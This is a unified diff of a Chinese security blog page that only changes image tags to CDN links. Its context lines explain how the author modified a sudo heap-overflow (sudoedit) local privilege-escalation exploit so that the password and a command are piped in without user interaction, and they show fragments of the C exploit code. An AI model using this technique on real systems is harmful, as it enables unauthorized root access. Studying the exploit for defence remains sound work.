@@ -82,13 +82,19 @@
 <p>该命令只适用于旧版，不建议在命令行中传递明文密码</p>
 </blockquote>
 <p>于是我查看了<code>sudoedit</code>的帮助参数：</p>
-<p><img src="../../../static/images/aee35152-4f5f-11ec-9dea-00d861bf4abb.png" alt="2021-02-10-02-34-34"></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/aee35152-4f5f-11ec-9dea-00d861bf4abb.png" alt="2021-02-10-02-34-34"  />
+  </p></p>
 <p>设置<code>-S</code>参数，可以直接通过管道符传递密码，那么也就是说，给Exploit增加这么一个参数就能在提权的时候不需要输入密码了，从而跳过交互，但前提还是需要用C语言模拟这个管道传递字符。</p>
 <h2 id="0x03-exploit分析">0x03 Exploit分析</h2>
 <p>本文修改的提权Exploit 溢出点主要是在环境变量中，通过调用<code>execve</code>触发。</p>
 <pre tabindex="0"><code>#include &lt;unistd.h&gt;
 int execve(const char *pathname, char *const argv[],char *const envp[]);
-</code></pre><p><img src="../../../static/images/af21b1ea-4f5f-11ec-b856-00d861bf4abb.png" alt="2021-02-10-02-44-51"></p>
+</code></pre><p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/af21b1ea-4f5f-11ec-b856-00d861bf4abb.png" alt="2021-02-10-02-44-51"  />
+  </p></p>
 <p>在21行传入了argv，可以将这个数组添加一个元素，也就是等同于添加一个命令行参数：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> sudoedit_argv[] <span style="color:#f92672">=</span> {
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;sudoedit&#34;</span>,
@@ -161,13 +167,19 @@ int execve(const char *pathname, char *const argv[],char *const envp[]);
 </span></span><span style="display:flex;"><span>        wait(<span style="color:#ae81ff">0</span>);
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p><img src="../../../static/images/af6100c0-4f5f-11ec-8c95-00d861bf4abb.png" alt="2021-02-10-03-10-12"></p>
+</span></span></code></pre></div><p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/af6100c0-4f5f-11ec-8c95-00d861bf4abb.png" alt="2021-02-10-03-10-12"  />
+  </p></p>
 <p>测试结果正确：2！</p>
 <p>stdin的值为：<code>test\r\n1111</code>，wc -l 命令读取是以<code>\n</code>为每一项分割的，因此返回的是2。</p>
 <p>这个方案可以直接拿到Exploit中，将stdin覆盖，向管道写入<code>密码\n命令</code>，然后把命令传入即可。</p>
 <p>为什么这里是<code>密码\n命令</code>呢？</p>
 <p>是因为第一个<code>\n</code>是为了结束密码的传递，然后开始堆溢出，溢出完成后，后续的命令刚好会传入到Shellcode启动的<code>/bin/sh</code>中。</p>
-<p><img src="../../../static/images/af9a9182-4f5f-11ec-8201-00d861bf4abb.png" alt="2021-02-10-03-13-24"></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/af9a9182-4f5f-11ec-8201-00d861bf4abb.png" alt="2021-02-10-03-13-24"  />
+  </p></p>
 <p>修改后的Exploit：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt; // execve()</span><span style="color:#75715e">
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt; // strcat()</span><span style="color:#75715e">
@@ -269,7 +281,10 @@ int execve(const char *pathname, char *const argv[],char *const envp[]);
 <pre tabindex="0"><code>Usage: ./exploit &lt;Command&gt; 
 [+]Refrence : @Qualys Research Team @Max Kamper 
 [+]Modify by Rvn0xsy@ https://payloads.online
-</code></pre><p><img src="../../../static/images/aff69068-4f5f-11ec-aa00-00d861bf4abb.png" alt="2021-02-10-03-18-26"></p>
+</code></pre><p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/aff69068-4f5f-11ec-aa00-00d861bf4abb.png" alt="2021-02-10-03-18-26"  />
+  </p></p>
 
 </div>
 <div class="container">
